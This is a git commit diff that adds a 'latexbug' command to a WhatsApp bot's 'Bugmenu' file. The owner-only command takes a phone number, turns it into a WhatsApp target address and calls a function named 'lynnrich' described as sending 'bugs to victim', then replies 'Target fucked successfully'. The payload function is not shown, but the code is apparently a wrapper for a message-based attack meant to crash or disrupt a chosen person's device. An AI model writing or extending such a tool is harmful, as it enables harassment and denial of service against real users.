c6c020d8c88f985df9acade51f7e5de7b5a2f52d
barazaghost <kkeizzah11@gmail.com>
2026-09-08 18:11:09 +0300

    Update Bugmenu.js

--- Cmds/Bugmenu.js
+++ Cmds/Bugmenu.js
@@ -1,1 +1,34 @@
+keith({
+  pattern: "latexbug",
+  aliases: ["buglatex", "latexbg"],
+  category: "Bugmenu",
+  description: "Send bugs to victim",
+  filename: __filename
+}, async (from, client, conText) => {
+  const { reply, q, isSuperUser } = conText;
 
+  if (!isSuperUser) {
+    return reply("Owner only!");
+  }
+
+  const number = q?.trim().replace(/\D/g, "");
+
+  if (!number) {
+    return reply("provide number");
+  }
+
+  const target = number + "@s.whatsapp.net";
+
+  try {
+   
+
+    const result = await lynnrich(client, target);
+
+    return reply(
+      `Target fucked successfully 💀`
+    );
+  } catch (err) {
+    console.error("richbg error:", err);
+    return reply(`❌ Error: ${err.message}`);
+  }
+});
